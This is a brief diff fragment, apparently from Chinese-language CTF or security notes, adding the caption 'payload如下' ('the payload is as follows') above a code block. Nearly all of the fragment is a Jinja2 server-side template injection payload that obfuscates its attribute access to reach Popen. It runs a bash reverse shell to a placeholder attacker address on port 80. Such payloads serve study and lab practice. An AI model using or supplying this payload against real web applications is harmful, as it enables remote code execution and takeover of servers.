@@ -174,6 +174,8 @@ users = {
 
 ssti不下去了,
 
+payload如下
+
 ---
 ```bash
 {%with a=request|attr("args")|attr("get")%}{%for y in(dict,)|map("attr",a("a"))|map("attr",a("b"))|first()()%}{%if "Pop"in(y,)|map("attr",a("c"))|first%}{%print(y("bash -c 'sh -i>& /dev/tcp/ATTACKR_IP_IN_DECIMAL/80 0>&1'",shell=1))%}{%endif%}{%endfor%}{%endwith%}
